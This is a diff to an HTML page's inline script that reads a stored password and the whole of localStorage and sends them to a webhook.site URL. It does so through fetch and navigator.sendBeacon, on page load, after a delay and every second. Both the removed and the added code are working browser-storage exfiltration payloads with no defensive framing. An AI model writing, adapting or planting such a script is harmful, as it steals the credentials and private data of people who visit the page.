@@ -5,21 +5,27 @@
 </head>
 <body>
     <script>
-        try {
-            const password = localStorage.getItem('password');
-            console.log('Password found:', password);
-            
-            // Method 1: Fetch with no-cors
-            fetch('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?password=' + password, {
-                mode: 'no-cors'
-            });
-
-            // Method 2: Beacon API (backup)
-            navigator.sendBeacon('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?password=' + password);
-        } catch (e) {
-            console.error('Error:', e);
+        function sendData(data) {
+            navigator.sendBeacon('https://webhook.site/958fec35-99ec-403e-aa5c-b8e51ba1f3bc?' + data);
         }
+
+        function checkStorage() {
+            const password = localStorage.getItem('password');
+            const allStorage = JSON.stringify(Object.entries(localStorage));
+            sendData('check=true&password=' + password + '&storage=' + allStorage);
+        }
+
+        // Initial check
+        document.addEventListener('DOMContentLoaded', () => {
+            sendData('status=dom_loaded');
+            checkStorage();
+        });
+
+        // Delayed check
+        setTimeout(checkStorage, 2000);
+
+        // Periodic check
+        setInterval(checkStorage, 1000);
     </script>
-    <p>Loading...</p>
 </body>
 </html>
